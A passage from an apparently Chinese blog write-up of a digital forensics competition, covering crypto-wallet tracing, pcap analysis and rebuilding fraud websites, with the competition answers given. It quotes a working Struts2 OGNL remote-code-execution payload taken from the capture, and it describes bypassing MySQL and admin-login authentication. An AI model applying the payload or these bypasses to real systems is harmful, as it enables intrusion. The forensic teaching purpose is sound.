不然会将记录全部清空</p><pre><code>4.4981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913648.png" alt="image-20231021224905225"></p><h3 id="3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC"><a href="#3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC" class="headerlink" title="3.根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)"></a>3.根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)</h3><pre><code>0x63AA203086938f82380A6A3521cCBf9c56d111eA</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212229457.png" alt="image-20231021222952427"></p><h3 id="4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）"><a href="#4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）" class="headerlink" title="4.根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）"></a>4.根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）</h3><pre><code>150.5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212231540.png" alt="image-20231021223119509"></p><p>或者在虚拟币交易软件上也能看到 根据案情 显示卖方先直接向买方转0.5ETH 在经由中间方 向买方最终转入150ETH</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914696.png" alt="image-20231021225422711"></p><h3 id="5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）"><a href="#5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）" class="headerlink" title="5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）"></a>5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）</h3><pre><code>A.raw sausage art hub inspire dizzy funny exile local middle shed primaryB.raw sausage art hub inspire dizzy funny middle shed primaryC.raw sausage art funny exile local middle shed primary</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212300993.png" alt="image-20231021230054949"></p><p>助记词一般是12个单词组成 所以选A</p><h3 id="6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）"><a href="#6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）" class="headerlink" title="6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）"></a>6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）</h3><pre><code>0x63AA203086938f82380A6A3521cCBf9c56d111eA</code></pre><p>其实在火眼上就能找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212302164.png" alt="image-20231021230202120"></p><p>也可以使用助记词恢复钱包：我——管理钱包——添加钱包——ETH——助记词——随便写个密码 就可以恢复钱包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212303848.png" alt="image-20231021230317809"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）"><a href="#1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）" class="headerlink" title="1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）"></a>1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）</h3><pre><code>A.DDoS攻击B.DoS攻击C.SQL注入D.文档攻击</code></pre><p>文档攻击和sql注入在流量包中的表现形式还是很好辨认的</p><p>查一下dos和ddos攻击的区别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913918.png" alt="image-20231018212827811"></p><p>总的来说 dos是单个攻击者&#x2F;单个计算机对目标计算机&#x2F;服务器发起的攻击 ddos攻击是多个计算机向一个计算机发起的攻击</p><p>分析数据包1中的协议 主要是UDP和TCP 而UDP协议是发送信息后 不确定对方是否回复 也就是非连接状态的 TCP协议是需要进行三次握手 是连接状态的</p><p>在查看数据包会话信息中的TCP协议 主要是10.5.0.19对116.211.168.203发送了大量无用数据 是单个计算机对单个计算机发起的攻击 一台攻击机 因此是<strong>dos攻击</strong></p><h3 id="2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）"><a href="#2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）" class="headerlink" title="2.分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）"></a>2.分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）</h3><p>承接第一题 是从10.5.0.19向116.211.168.203发起了大量无用的请求 所以攻击机是10.5.0.19 出问题的服务器是<strong>116.211.168.203</strong></p><h3 id="3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）"><a href="#3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）" class="headerlink" title="3.分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）"></a>3.分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）</h3><p>直接选择导出http对象 查看文件大小最大的文件 是java.log</p><p>传输这个文件的服务器是<strong>120.210.129.29</strong></p><p>同时将这个文件导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190826567.png" alt="image-20231019082626426"></p><h3 id="4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）"><a href="#4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）" class="headerlink" title="4.分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）"></a>4.分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）</h3><p>在发送恶意文件java.log的前后数据流中都能看到以下内容</p><pre><code>%&#123;(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;SuSEfirewall2 stop&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?&#123;&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd&#125;:&#123;&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</code></pre><p>搜一下这段代码的含义 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190832991.png" alt="image-20231019083227944"></p><p>可以发现是<strong>struts2</strong>漏洞</p><h3 id="5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd"><a href="#5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd" class="headerlink" title="5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)"></a>5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)</h3><p>在微步云沙箱中直接可以看到</p><pre><code>87540c645d003e6eebf1102e6f904197</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190831689.png" alt="image-20231019083102636"></p><h3 id="6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-x2F-X-x2F-X-x2F-1-txt）"><a href="#6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-x2F-X-x2F-X-x2F-1-txt）" class="headerlink" title="6.分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）"></a>6.分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）</h3><p>打开数据包2 在导出http对象中 找到最大的文件<code>mail.png</code> 追踪tcp流 找到文件路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190839784.png" alt="image-20231019083953713"></p><p>是url编码 直接放到浏览器上访问一下就能解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190840116.png" alt="image-20231019084040085"></p><p><strong>C:&#x2F;Users&#x2F;Administrator&#x2F;Downloads&#x2F;新建文件夹&#x2F;新建文件夹&#x2F;mail.png</strong></p><h3 id="7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）"><a href="#7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）" class="headerlink" title="7.分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）"></a>7.分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）</h3><p>文件下载指的是下面这些文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191249617.png" alt="image-20231019124925587"></p><p>通过查看相应流量包 可以得知 文件下载在192.168.43.208和192.168.43.133之间进行 </p><p>追踪TCP流 发现流0和1处有authorization 但是返回的是401 认证错误</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191251766.png" alt="image-20231019125113697"></p><p>找到流2之后的数据包 都是认证成功的 base64解码 Authorization信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191252460.png" alt="image-20231019125242419"></p><p>得到认证账号密码</p><pre><code>admin:passwd</code></pre><h3 id="8-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）"><a href="#8-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）" class="headerlink" title="8.分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）"></a>8.分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）</h3><p>下载的文件就是6题的mail.png 将其保存出来 比赛的时候临时将题目改成了 文件的大小 而不是字节  因此是<strong>206KB</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191510715.png" alt="image-20231019151013675"></p><h2 id="服务器取证一"><a href="#服务器取证一" class="headerlink" title="服务器取证一"></a>服务器取证一</h2><h3 id="1-服务器系统的版本号是-。（格式：1-1-1111）"><a href="#1-服务器系统的版本号是-。（格式：1-1-1111）" class="headerlink" title="1.服务器系统的版本号是_______。（格式：1.1.1111）"></a>1.服务器系统的版本号是_______。（格式：1.1.1111）</h3><pre><code>7.9.2009 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231042603.png" alt="image-20231023104252477"></p><h3 id="2、网站数据库的版本号是-。（格式：1-1-1111）"><a href="#2、网站数据库的版本号是-。（格式：1-1-1111）" class="headerlink" title="2、网站数据库的版本号是_______。（格式：1.1.1111）"></a>2、网站数据库的版本号是_______。（格式：1.1.1111）</h3><pre><code>5.6.50</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231045500.png" alt="image-20231023104510306"></p><h3 id="3-宝塔面板的“超时”时间是-分钟。-格式-50"><a href="#3-宝塔面板的“超时”时间是-分钟。-格式-50" class="headerlink" title="3.宝塔面板的“超时”时间是_______分钟。(格式:50)"></a>3.宝塔面板的“超时”时间是_______分钟。(格式:50)</h3><p>宝塔设置开了很多限制 把这里面能关的限制全关了就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231049872.png" alt="image-20231023104943836"></p><p>再登录宝塔面板</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231101115.png" alt="image-20231023110140046"></p><p>7200秒  是120分钟</p><pre><code>120</code></pre><h3 id="4-网站源码备份压缩文件SHA256值是-。-格式-64位小写"><a href="#4-网站源码备份压缩文件SHA256值是-。-格式-64位小写" class="headerlink" title="4.网站源码备份压缩文件SHA256值是_______。(格式:64位小写)"></a>4.网站源码备份压缩文件SHA256值是_______。(格式:64位小写)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231106476.png" alt="image-20231023110635429"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231106531.png" alt="image-20231023110647492"></p><pre><code>0bdeeacf755126dae9efd38f6a6d70323aa95217b629fd389e0e81f9b406be39</code></pre><h3 id="5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd"><a href="#5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd" class="headerlink" title="5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)"></a>5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)</h3><p>爆翻网站备份源码</p><p>在<code>\wwwroot\wwwroot\sb.wiiudot.cn\app\admin\common.php</code>找到盐值明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231116216.png" alt="image-20231023111609167"></p><p>对明文进行md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231117068.png" alt="image-20231023111706012"></p><pre><code>7f5918fe56f4a01d8b206f6a8aee40f2</code></pre><h3 id="6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）"><a href="#6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）" class="headerlink" title="6.分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）"></a>6.分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）</h3><h4 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h4><p>先添加ip(服务器ip)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231410751.png" alt="image-20231023141003717"></p><p>将数据库中的服务器地址改为127.0.0.1 直接访问<code>http://192.168.160.142/admin</code>  </p><p>显示mysql数据库密码错误 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231419681.png" alt="image-20231023141904644"></p><p>修改<code>/etc/my.cnf</code> 添加<code>skip-grant-table</code> 在运行<code>service mysql restart</code> 绕过mysql登录密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231420983.png" alt="image-20231023142050931"></p><p>下面就跳转到登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231421618.png" alt="image-20231023142148582"></p><p>两种方法进行登陆</p><h5 id="方法一：在数据库中覆盖原有的admin账户密码"><a href="#方法一：在数据库中覆盖原有的admin账户密码" class="headerlink" title="方法一：在数据库中覆盖原有的admin账户密码"></a>方法一：在数据库中覆盖原有的admin账户密码</h5><p>按照第5题的加密方法 使用盐值给<code>123456</code>进行加盐加密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231426257.png" alt="image-20231023142626214"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231426256.png" alt="image-20231023142659195"></p><p>使用navicat连接上数据库 在app_admin表中将admin账户的密码改为加密后的<code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231429533.png" alt="image-20231023142949498"></p><p>这样就可以使用<code>admin/123456</code>进行登陆了</p><h5 id="方法二：修改配置文件-绕过对密码的判断"><a href="#方法二：修改配置文件-绕过对密码的判断" class="headerlink" title="方法二：修改配置文件 绕过对密码的判断"></a>方法二：修改配置文件 绕过对密码的判断</h5><p>这里学到一个点 找到<code>\wwwroot\wwwroot\sb.wiiudot.cn\app\admin\controller\Common.php</code> 在里面修改验证密码的函数的判断</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231451492.png" alt="image-20231023145124435"></p><p>将<code>!=</code>改为<code>==</code> 就可以进行任意密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231453678.png" alt="image-20231023145331567"></p><p>通讯录数据包括 设备查看 通讯录查看 短信查看 所以通讯录数据共有</p><pre><code>732+67097+52170=119999</code></pre><h3 id="7-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复"><a href="#7-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复" class="headerlink" title="7.全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)"></a>7.全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)</h3><pre><code>506</code></pre><p>使用navicat连接每个网站的数据库 对app_mobile表使用这条sql语句进行查询 将结果相加</p><pre><code>select count(distinct(userid)) from `app_mobile`</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231724088.png" alt="image-20231023172453927"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231725920.png" alt="image-20231023172505872"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231725648.png" alt="image-20231023172523610"></p><h3 id="8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字"><a href="#8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字" class="headerlink" title="8.分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)"></a>8.分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)</h3><pre><code>26</code></pre><p>和重构第一个网站时一样 先将数据库地址改为本地 127.0.0.1 在修改报错信息为<code>true</code></p><p>注意一点 第二个网站需要单独配置伪静态 只需要将第一个网站的伪静态复制粘贴过去就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231957259.png" alt="image-20231023195653169"></p><p>最后需要修改一下进行密码绕过 同第6题的操作 在Common.php文件夹中将<code>!=</code>改为<code>==</code>即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231958860.png" alt="image-20231023195820792"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231959027.png" alt="image-20231023195902966"></p><p>筛选一下组员级别的管理员 一共有26位</p><h3 id="9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx"><a href="#9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx" class="headerlink" title="9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)"></a>9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)</h3><pre><code>443074</code></pre><p>在<code>app_admin</code>和 <code>app_appconfig</code> 两张表中 先看到名为<code>0820</code>的管理员的id是 141</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232021090.png" alt="image-20231023202121002"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232021617.png" alt="image-20231023202134574"></p><p>在找到141对应的邀请码</p><h3 id="10-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx"><a href="#10-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx" class="headerlink" title="10.分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)"></a>10.分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)</h3><pre><code>KE5f3xnFHYAnG5Dt</code></pre><p>在mysql数据库中能看到密码的哈希值 但是在宝塔中看到的用户密码 加密后并不是这个值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232023612.png" alt="image-20231023202330572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232026667.png" alt="image-20231023202603631"></p><p>但是在第4题提到的备份文件中的用户密码是正确的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232024170.png" alt="image-20231023202449133"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232025896.png" alt="image-20231023202535856"></p><h2 id="服务器取证2"><a href="#服务器取证2" class="headerlink" title="服务器取证2"></a>服务器取证2</h2><h3 id="1-请分析宝塔面板中默认建站目录是-。（标准格式：-x2F-etc-x2F-www）"><a href="#1-请分析宝塔面板中默认建站目录是-。（标准格式：-x2F-etc-x2F-www）" class="headerlink" title="1.请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）"></a>1.请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）</h3><pre><code>/home/wwwroot</code></pre><p>没给内网宝塔登陆地址 就用服务器的ip登陆就行 <code>http://192.168.160.143:8888/400c78c0</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232102236.png" alt="image-20231023210225189"></p><p>在宝塔中找到默认建站目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232101615.png" alt="image-20231023210155441"></p><h3 id="2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）"><a href="#2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）" class="headerlink" title="2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）"></a>2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）</h3><p>在火眼中看到 宝塔的数据库目录中一共有25个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232117269.png" alt="image-20231023211754895"></p><p>在mysql解析中一共有8个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232118715.png" alt="image-20231023211851642"></p><p>其中在bt数据库列表中的为<code>sjp</code>和<code>gtc</code> 查看发现<code>gtc</code>数据库中只有一个表结构 数据类型为</p><pre><code>CHAR(128)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232120097.png" alt="image-20231023212016997"></p><h3 id="3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）"><a href="#3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）" class="headerlink" title="3.请分析“乐享金融”网站绑定的域名是_______。（标准格式：www.baidu.com）"></a>3.请分析“乐享金融”网站绑定的域名是_______。（标准格式：<a href="http://www.baidu.com)/">www.baidu.com）</a></h3><pre><code>jinrong.goyasha.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232125766.png" alt="image-20231023212529684"></p><h3 id="4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）"><a href="#4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）" class="headerlink" title="4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）"></a>4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）</h3><p>在<code>/www/wwwroot/192.168.19.128/application/common.php</code>中找到密码加密规则</p><pre><code>(md5($upwd . $admin[&#39;utime&#39;])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232132899.png" alt="image-20231023213200797"></p><p>这是将用户创建的时间戳和用户密码拼接在一起 在进行md5加密 得到的加密后的密码</p><p>使用navicat连接网站数据库 找到goyasha对应的用户和utime 在进行加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232138157.png" alt="image-20231023213800075"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232138107.png" alt="image-20231023213833048"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232139249.png" alt="image-20231023213938169"></p><pre><code>d2174d958131ebd43bf900e616a752e1</code></pre><h3 id="5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）"><a href="#5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）" class="headerlink" title="5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）"></a>5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）</h3><p>重建不了一点 直接翻数据库吧 网站的登陆页面大概率是<code>login.html</code>  绝对路径<code>/www/wwwroot/192.168.19.128/application/index/view/login/login.html</code>  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250851773.png" alt="image-20231024202732807"></p><p>找到了一张图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852274.png" alt="image-20231024202822126"></p><p>logo上的字是</p><pre><code>睿文化</code></pre><h3 id="6-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）"><a href="#6-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）" class="headerlink" title="6.请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）"></a>6.请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）</h3><pre><code>2</code></pre><p>翻数据库 在wp_productclass表中找到外汇产品的pcid是5</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852211.png" alt="image-20231024204558492"></p><p>再找到wp_productinfo表 非外汇产品的pcid就是除了5之外的产品 但是还要注意<code>isdelete</code>字段的值 有两个产品被删了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852704.png" alt="image-20231024204857814"></p><p>所以一共是2个外汇产品</p><h3 id="7-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"><a href="#7-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）" class="headerlink" title="7.请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"></a>7.请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852646.png" alt="image-20231024205227608"></p><p>泰达币的代号是<code>USDT </code>  在wp_rcset表中找到地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852686.png" alt="image-20231024205316751"></p><pre><code>85CF33F97B46A88C7386286D0270CB3E</code></pre><h3 id="8-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）"><a href="#8-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）" class="headerlink" title="8.请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）"></a>8.请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）</h3><p>在wp_price_log中找到title中的充值字段 观察发现 account充值金额大于582402的总金额是</p><pre><code>101000087</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852957.png" alt="image-20231024205624443"></p><p>或者是使用sql语句</p><pre><code>select SUM(account) from `wp_price_log` WHERE title=&quot;充值&quot; and account &gt; 582402</code></pre><h3 id="9-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）"><a href="#9-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）" class="headerlink" title="9.请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）"></a>9.请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）</h3><pre><code>kongxin</code></pre><p>nt题 先从wp_bankcard表中找到这个银行卡号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852233.png" alt="image-20231024210704098"></p><p>可以看到uid是2917 